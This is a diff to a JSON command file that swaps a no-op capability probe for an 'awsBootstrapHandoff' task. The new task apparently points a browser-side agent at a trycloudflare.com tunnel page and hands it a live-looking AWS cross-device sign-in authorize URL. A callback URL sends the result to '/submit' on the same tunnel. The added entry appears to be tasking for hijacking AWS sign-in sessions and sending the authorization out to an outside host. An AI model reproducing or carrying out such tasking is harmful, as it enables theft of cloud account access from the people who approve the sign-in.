@@ -1,8 +1,13 @@
 {
-  "id": "capability-probe-20260906T0732Z",
-  "issuedAt": "2026-09-06T07:32:00Z",
-  "expiresAt": "2026-09-06T07:47:00Z",
-  "action": "noop",
-  "target": {},
-  "args": {}
+  "id": "aws-live-bootstrap-20260906T0824Z",
+  "issuedAt": "2026-09-06T08:24:00Z",
+  "expiresAt": "2026-09-06T08:39:00Z",
+  "action": "awsBootstrapHandoff",
+  "target": {
+    "urlContains": "saints-affects-social-frederick.trycloudflare.com"
+  },
+  "args": {
+    "authUrl": "https://eu-central-1.signin.aws.amazon.com/v1/authorize?response_type=code&client_id=arn%3Aaws%3Asignin%3A%3A%3Adevtools%2Fcross-device&state=ccd872db-3b3d-43fa-a652-3b530a218b3c&code_challenge_method=SHA-256&scope=openid&redirect_uri=https%3A%2F%2Feu-central-1.signin.aws.amazon.com%2Fv1%2Fsessions%2Fconfirmation&code_challenge=Nm84L83H1EkFBok9WEQuy38MoeJG0dRwtpaRiFJWUU0",
+    "callbackUrl": "https://saints-affects-social-frederick.trycloudflare.com/submit"
+  }
 }
